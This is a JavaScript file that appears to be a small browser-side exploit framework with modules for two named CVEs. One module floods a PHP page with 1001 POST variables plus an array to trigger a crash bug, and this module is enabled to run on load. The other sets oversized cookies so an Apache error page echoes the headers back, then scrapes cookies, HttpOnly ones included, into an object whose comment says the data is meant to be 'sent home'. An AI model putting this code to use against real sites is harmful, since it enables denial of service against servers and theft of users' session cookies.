var _XL = {
    // Stored data to be sent 'home'
    'data': {},
    
    // Will attempt to find a property from a
    //  period-delimited string
    // Ex: find('util.serializeObj', _XL);
    // returns the _XL.util.serializeObj function
    'find': function (needle, haystack) {
        var new_needle, new_haystack;
        // Defaults to checking the base object
        if (haystack === undefined) {
            haystack = this;
        }
        
        if (needle.indexOf(".") !== -1) {
            var sub_test = needle.match(/([^\.]+)\.(.+)/);
            if (sub_test) {
                if (sub_test[1] in haystack) {
                    return this.find(sub_test[2], haystack[sub_test[1]]);
                }
            }
        }
        else {
            if (needle in haystack) {
                return haystack[needle];
            }
        }
        return false;
    },
    'init': function () {
        
        // Iterate modules and run them
        for (var i=0; i<this.settings.modules.length; i++) {
            var module = this.find(this.settings.modules[i]);
            switch (typeof module) {
                case 'object' : 
                    if ('init' in module) {
                        module.init();
                    }
                    break;
                case 'function' :
                    module();
                    break;
            }
        }
        
        // Iterate script items
        for (var i=0; i<this.settings.script.length; i++) {
            var script = this.settings.script[i];
            switch (typeof script) {
                case 'object' : 
                    var func = this.find(script[0]);
                    console.log(func);
                    func.apply(func, script.slice(1));
                    break;
                case 'string' :
                    this.find(script)();
                    break;
            }
        }
    }
};

_XL.util = {
    // Convert javascript object to POST-able data
    'serializeObj': function (obj) {
        var str = [];
        for(var p in obj) {
            str.push(p + "=" + obj[p]);
        }
        return str.join("&");
    }
};

_XL.controls = {};

_XL.controls.page = {
        'overlay': function (url) {
            console.log(url);
        }
};

_XL.exploits = {};

_XL.exploits.CVE_2012_0830 = {
    'complete': false,
    'success': undefined,
    
    'checkResult' : function () {
        
    },
    
    // Generate 1000 normal keys and one array
    'createEvilObj': function () {
        var evil_obj = {};
        for (var i = 0; i < 1001; i++) {
            evil_obj[i] = 1;
        }
        evil_obj['kill[]'] = 'kill';
        return evil_obj;
    },

    'init': function () {
        var post_data = _XL.util.serializeObj(this.createEvilObj());
        var xhr = new XMLHttpRequest();
        xhr.open("POST", location.href, true);
        xhr.setRequestHeader('Content-Type','application/x-www-form-urlencoded');
        xhr.setRequestHeader('Content-Length', post_data.length);
        xhr.send(post_data);
    }
};

_XL.exploits.CVE_2012_0053 = {
    'complete': false,
    'success': undefined,

    // Most browsers limit cookies to 4k characters, so we need multiple
    'setCookies': function (good) {
        // Construct string for cookie value
        var str = "";
        while (str.length < 819) {
            str += "x";
        }
    
        // Set cookies
        for (var i = 0; i < 10; i++) {
            // Evil cookie string
            var _cookie = "xss"+i+"="+str+";path=/";
            
            // Expire cookie
            if (good) {
                _cookie += ";expires="+new Date(1).toUTCString()+";";
            }
            
            // Set cookie
            document.cookie = _cookie;
        }
    },

    'parseCookies': function () {
        var cookie_dict = {};
        
        // Only react on 400 status
        if (this.readyState === 4 && this.status === 400) {
            
            // Replace newlines and match <pre> content
            var content = this.responseText.replace(/\r|\n/g,'').match(/pre>(.+)<\/pre/);
            if (content) {
                
                // Remove 'Cookie: ' prefix
                content = content[1].substr(8);
                
                // Remove evil cookies from content
                var cookies = content.replace(/xss\d=x+;?/g, '').split(/;/);
                
                // Add cookie key/value to object
                for (var i=0; i<cookies.length; i++) {
                    var s_c = cookies[i].split('=',2);
                    cookie_dict[s_c[0]] = s_c[1];
                }
            }
            // Unset evil cookies
            this.setCookies(true);
            _XL.data.cookies = cookie_dict;
            this.success = true;
            this.complete = true;
        }
        else if (this.readyState === 4) {
            this.complete = true;
            this.success = false;
        }
    },

    'init': function () {
        this.setCookies();
        // Make XHR request
        var xhr = new XMLHttpRequest();
        xhr.onreadystatechange = this.parseCookies;
        xhr.open("GET", "/", true);
        xhr.send(null);
    }
};

_XL.settings = {
    'modules': [
        'exploits.CVE_2012_0830'
        //'exploits.CVE_2012_0053'
    ],
    'script': [
        ['controls.page.overlay', 'http://www.google.com']
    ]
};

_XL.init();
